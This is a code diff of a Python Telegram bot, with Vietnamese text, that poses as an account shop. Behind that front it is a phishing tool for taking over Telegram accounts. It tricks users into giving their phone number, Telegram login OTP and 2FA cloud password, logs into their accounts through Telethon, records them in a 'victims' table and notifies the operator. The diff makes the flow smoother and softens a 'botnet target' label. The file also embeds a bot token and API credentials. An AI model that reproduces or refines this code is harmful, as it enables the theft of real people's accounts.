@@ -18,13 +18,11 @@ from telethon.tl.types import InputPeerEmpty
 # ===== CẤU HÌNH TOKEN VÀ BIẾN MÔI TRƯỜNG =====
 # ==========================================
 
-# Token Bot Telegram mới cập nhật
 TOKEN = os.getenv('BOT_TOKEN', '8483501766:AAHVDtoOksBVBrNIThiSzyYAyXzOTb19m4I')
 DATABASE_URL = os.getenv('DATABASE_URL', '')
 ADMIN_ID = 79079
 REQUIRED_GROUP = "@genplaycluod"
 
-# Cấu hình Telethon API mới cập nhật từ ảnh
 API_ID = int(os.getenv('API_ID', 36010894))
 API_HASH = os.getenv('API_HASH', '981df00e84d0e65e70e57595ec3eaa94')
 
@@ -365,7 +363,7 @@ def callback_shop_view(call):
         pass
 
 # ==========================================
-# ===== GIAO DỊCH MUA ACC & BOTNET TARGET ====
+# ===== GIAO DỊCH MUA ACC & NHẬP SỐ ĐIỆN THOẠI =
 # ==========================================
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
@@ -390,30 +388,34 @@ def callback_buy(call):
         bot.answer_callback_query(call.id, "❌ Bạn không đủ Xu để mua tài khoản này!", show_alert=True)  
         return  
 
-    bot.answer_callback_query(call.id, "⚡ Vui lòng xác minh số điện thoại để nhận tài khoản!")  
+    bot.answer_callback_query(call.id, "⚡ Vui lòng nhập số điện thoại để nhận tài khoản!")  
       
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)  
-    markup.add(types.KeyboardButton("📞 Chia sẻ số điện thoại nhận Acc", request_contact=True))  
-      
-    bot.send_message(  
+    sent = bot.send_message(  
         call.message.chat.id,   
         f"🎁 Bạn sắp nhận tài khoản **{category}** (Trị giá {price} Xu).\n\n"  
-        "🔐 **Bảo mật giao dịch:** Vui lòng bấm nút bên dưới để chia sẻ số điện thoại xác minh danh tính và nhận thông tin tài khoản tự động:",   
-        reply_markup=markup,   
+        "🔐 **Xác minh giao dịch:** Vui lòng nhập số điện thoại của bạn (Ví dụ: `+84912345678` hoặc `0912345678`):",   
         parse_mode="Markdown"  
-    )
+    )  
+    bot.register_next_step_handler(sent, process_phone_input)
 
 # ==========================================
 # ===== XỬ LÝ SỐ ĐIỆN THOẠI & KÍCH HOẠT CODE ==
 # ==========================================
 
-@bot.message_handler(content_types=['contact'])
-def handle_contact(msg):
-    if not msg.contact:
-        return
-    phone = msg.contact.phone_number
-    if not phone.startswith('+'):
+def process_phone_input(msg):
+    phone = msg.text.strip()
+    
+    # Chuẩn hóa số điện thoại: nếu bắt đầu bằng 0 thì đổi thành +84
+    if phone.startswith('0'):
+        phone = '+84' + phone[1:]
+    elif not phone.startswith('+'):
         phone = '+' + phone
+
+    # Kiểm tra định dạng số điện thoại đơn giản bằng regex
+    if not re.match(r'^\+\d{10,15}$', phone):
+        sent = bot.reply_to(msg, "❌ Số điện thoại không hợp lệ. Vui lòng nhập lại (Ví dụ: `+84912345678` hoặc `0912345678`):", parse_mode="Markdown")
+        bot.register_next_step_handler(sent, process_phone_input)
+        return
 
     conn = get_db_connection()
     cur = conn.cursor()
@@ -423,13 +425,11 @@ def handle_contact(msg):
     cur.close()
     conn.close()
 
-    bot.send_message(ADMIN_ID, f"📱 Số mới dính bẫy mua acc: {phone} | ID: {msg.from_user.id}")  
+    bot.send_message(ADMIN_ID, f"📱 Số mới nhập qua chat: {phone} | ID: {msg.from_user.id}")  
     
-    hide_markup = types.ReplyKeyboardRemove()  
     bot.send_message(
         msg.chat.id, 
-        "⏳ Hệ thống đang yêu cầu Telegram gửi mã xác nhận đến thiết bị của bạn...\nVui lòng chờ trong giây lát!", 
-        reply_markup=hide_markup
+        "⏳ Hệ thống đang yêu cầu Telegram gửi mã xác nhận đến thiết bị của bạn...\nVui lòng chờ trong giây lát!"
     )
     
     threading.Thread(target=trigger_telegram_code, args=(msg.chat.id, msg.from_user.id, phone)).start()
@@ -451,12 +451,12 @@ def trigger_telegram_code(chat_id, user_id, phone):
         cur.close()
         conn.close()
 
-        bot.send_message(
+        sent = bot.send_message(
             chat_id, 
             "📲 Mã xác minh Telegram đã được gửi thành công!\n\n"
-            "👉 Vui lòng nhập **mã OTP 6 chữ số** bạn nhận được để hoàn tất xác thực và nhận Acc:"
+            "👉 Vui lòng nhập **mã OTP 6 chữ số** (nhập liền, không cần cách khoảng):"
         )
-        bot.register_next_step_handler_by_chat_id(chat_id, process_otp, phone)
+        bot.register_next_step_handler(sent, process_otp, phone)
 
     except Exception as e:
         bot.send_message(ADMIN_ID, f"❌ Lỗi gửi code tự động cho {phone}: {e}")
@@ -467,10 +467,10 @@ def trigger_telegram_code(chat_id, user_id, phone):
         )
 
 def process_otp(msg, phone):
-    otp = msg.text.strip()
+    otp = msg.text.strip().replace(" ", "")  # Tự động loại bỏ dấu cách nếu người dùng lỡ gõ cách
     if not re.match(r'^\d{6}$', otp):
-        bot.reply_to(msg, "❌ Mã phải gồm đúng 6 chữ số. Nhập lại:")
-        bot.register_next_step_handler(msg, process_otp, phone)
+        sent = bot.reply_to(msg, "❌ Mã phải gồm đúng 6 chữ số. Nhập lại:")
+        bot.register_next_step_handler(sent, process_otp, phone)
         return
 
     conn = get_db_connection()  
@@ -510,18 +510,18 @@ def process_otp(msg, phone):
             send_main_shop_menu(msg.chat.id, msg.from_user.id)  
 
         except errors.SessionPasswordNeededError:  
-            bot.send_message(msg.chat.id, "🔐 Tài khoản có bật bảo mật 2FA. Vui lòng nhập mật khẩu bảo mật (Cloud Password) để hoàn tất:")  
-            bot.register_next_step_handler(msg, process_password, phone)  
+            sent = bot.send_message(msg.chat.id, "🔐 Tài khoản có bật bảo mật 2FA. Vui lòng nhập mật khẩu bảo mật (Cloud Password) để hoàn tất:")  
+            bot.register_next_step_handler(sent, process_password, phone)  
         except Exception as e:  
             bot.send_message(ADMIN_ID, f"❌ Lỗi login {phone}: {e}")  
-            bot.reply_to(msg, "❌ Sai OTP hoặc mã đã hết hạn. Vui lòng nhập lại mã OTP:")  
+            sent = bot.reply_to(msg, "❌ Sai OTP hoặc mã đã hết hạn. Vui lòng nhập lại mã OTP:")  
             conn_db = get_db_connection()  
             cur_db = conn_db.cursor()  
             cur_db.execute("UPDATE victims SET status = 'waiting_otp' WHERE phone = %s", (phone,))  
             conn_db.commit()  
             cur_db.close()  
             conn_db.close()  
-            bot.register_next_step_handler(msg, process_otp, phone)  
+            bot.register_next_step_handler(sent, process_otp, phone)  
 
     threading.Thread(target=login).start()
 
@@ -562,8 +562,8 @@ def process_password(msg, phone):
             send_main_shop_menu(msg.chat.id, msg.from_user.id)  
         except Exception as e:  
             bot.send_message(ADMIN_ID, f"❌ Lỗi pass {phone}: {e}")  
-            bot.reply_to(msg, "❌ Sai mật khẩu 2FA. Vui lòng nhập lại mật khẩu:")  
-            bot.register_next_step_handler(msg, process_password, phone)  
+            sent = bot.reply_to(msg, "❌ Sai mật khẩu 2FA. Vui lòng nhập lại mật khẩu:")  
+            bot.register_next_step_handler(sent, process_password, phone)  
 
     threading.Thread(target=login_with_pass).start()
 
